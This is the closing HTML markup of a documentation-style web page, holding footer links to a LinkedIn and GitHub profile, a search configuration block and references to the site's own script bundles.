    <a href="https://www.linkedin.com/in/joeammond/" target="_blank" rel="noopener" title="www.linkedin.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
    </a>
  
    
    
      
      
    
    <a href="https://github.com/joeammond" target="_blank" rel="noopener" title="github.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    <script id="__config" type="application/json">{"base": "..", "features": [], "translations": {"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing", "select.version.title": "Select version"}, "search": "../assets/javascripts/workers/search.361d90f1.min.js"}</script>
    
    
      <script src="../assets/javascripts/bundle.289a2a4b.min.js"></script>
      
    
  </body>
</html>